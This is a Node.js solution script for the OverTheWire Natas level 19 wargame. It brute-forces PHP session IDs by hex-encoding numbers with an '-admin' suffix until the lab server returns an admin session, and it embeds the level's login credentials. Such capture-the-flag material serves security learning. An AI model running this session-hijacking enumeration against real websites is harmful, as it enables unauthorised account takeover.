#!/usr/bin/env node
/* eslint-disable */
http = require('http');

abc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP';
credentials = {
    host: 'natas19.natas.labs.overthewire.org',
    login: 'natas19',
    password: '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
}

let t = 0;
let i = 640

while (--i)
    doReq(i)

function toHex(str) {
    str = '' + str
    var result = '';
    for (var i = 0; i < str.length; i++) {
        result += str.charCodeAt(i).toString(16);
    }
    return result;
}

function doReq(n, l) {
    const id = n
    console.log('start ', n);
    const postData = 'username=admin&password=admin';
    const data = 'username=admin&password=admin';


    const options = {
        host: credentials.host,
        path: '/index.php?debug=true',
        method: 'POST',
        auth: `${credentials.login}:${credentials.password}`,
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': Buffer.byteLength(postData),
            'COOKIE': 'PHPSESSID=' + toHex(n) + '2d61646d696e;'

        }
    };
    console.log('PHPSESSID=' + toHex(n) + '2d61646d696e;')
    //3239382d61646d696e
    //3338302d6161616161616161616161
    //3234322d6161616161616161616161
    //3533342d6161616161616161616161
    //3233332d6161616161616161616161

    const req = http.request(options, (res) => {
        // console.log(`STATUS:console. ${res.statusCode}`);
        // console.log(`HEADERS: ${JSON.stringify(res.headers)}`);
        // console.log(JSON.stringify(res.headers).match(/PHPSESSID=\w*;?/)[0]);
        res.setEncoding('utf8');
        let total = '';
        res.on('data', (chunk) => {
            total += chunk;
        });
        res.on('end', () => {
            if (l)
                console.log(total);
            if (!total.match('You are logged in as a regular user. Login as an admin to retrieve credentials for natas20.')) {
                console.log(total);
                process.exit()
            }
            console.log('end', ++t, id)
        });
    });
    req.on('error', (e) => {
        console.error(`problem with request: ${e.message}`);
        process.exit();
    });

    // write data to request body
    req.write(postData);
    req.end();
}

// doReq(331,true);